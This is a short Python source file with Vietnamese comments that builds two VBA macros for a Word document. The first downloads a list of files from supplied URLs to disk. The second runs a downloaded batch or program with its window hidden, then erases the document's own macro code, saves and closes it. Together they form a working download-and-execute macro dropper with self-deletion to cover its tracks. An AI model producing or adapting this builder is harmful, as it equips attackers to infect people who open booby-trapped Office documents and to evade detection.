# Đây là file chứa đoạn code để sinh ra sub A và Sub B trong mã VBA.
# Sub A là download nhiều link
# Sub B là thực thi file 


class OriginalBuilder:
    def __init__(self):
        pass
    def _convert_list_to_vba_array(self, items):
        if not items:
            return 'Array()'

        vba_array = 'Array( _\n'
        for idx, item in enumerate(items):
            if idx != len(items) - 1:
                vba_array += f'    "{item}", _\n'
            else:
                vba_array += f'    "{item}" _\n'
        vba_array += ')'
        return vba_array

    def build_sub_a(self, url_list, path_list):
        if len(url_list) != len(path_list):
            raise ValueError("Số lượng URL và PATH phải bằng nhau.")

        urls_vba = f"urls = {self._convert_list_to_vba_array(url_list)}"
        paths_vba = f"paths = {self._convert_list_to_vba_array(path_list)}"

        sub_a = f"""Sub A()
    Dim http As Object
    Dim adoStream As Object
    Dim fileURL As Variant
    Dim savePath As String
    Dim urls As Variant
    Dim paths As Variant
    Dim i As Integer
    Dim startTime As Double
    {urls_vba}
    {paths_vba}
    For i = LBound(urls) To UBound(urls)
        fileURL = urls(i)
        savePath = paths(i) & Mid(fileURL, InStrRev(fileURL, "/") + 1)
        Set http = CreateObject("MSXML2.XMLHTTP")
        http.Open "GET", fileURL, False
        http.Send
        If http.Status = 200 Then
            Set adoStream = CreateObject("ADODB.Stream")
            adoStream.Type = 1 ' binary
            adoStream.Open
            adoStream.Write http.responseBody
            adoStream.SaveToFile savePath, 2 ' Overwrite
            adoStream.Close
        Else
            MsgBox "Error DL: " & fileURL & vbCrLf & "Status: " & http.Status, vbExclamation
        End If
        Do While Dir(savePath) = ""
            startTime = Timer
            Do While Timer < startTime + 1
                DoEvents
            Loop
        Loop
        Set adoStream = Nothing
        Set http = Nothing
    Next i
End Sub
"""
        return sub_a

    def build_sub_b(self, main_file_path):
        sub_b = f"""Sub B()
    Dim createBatPath As String
    Dim startTime As Double
    createBatPath = "{main_file_path}"
    Do While Dir(createBatPath) = ""
        startTime = Timer
        Do While Timer < startTime + 1
            DoEvents
        Loop
    Loop
    Shell createBatPath, vbHide
    MsgBox "Done"
    Set vbComp = ThisDocument.VBProject.VBComponents("ThisDocument")
    Dim lineCount As Long
    lineCount = vbComp.CodeModule.CountOfLines
    vbComp.CodeModule.DeleteLines 1, lineCount
    ThisDocument.Save
    ThisDocument.Close SaveChanges:=False
End Sub
"""
        return sub_b
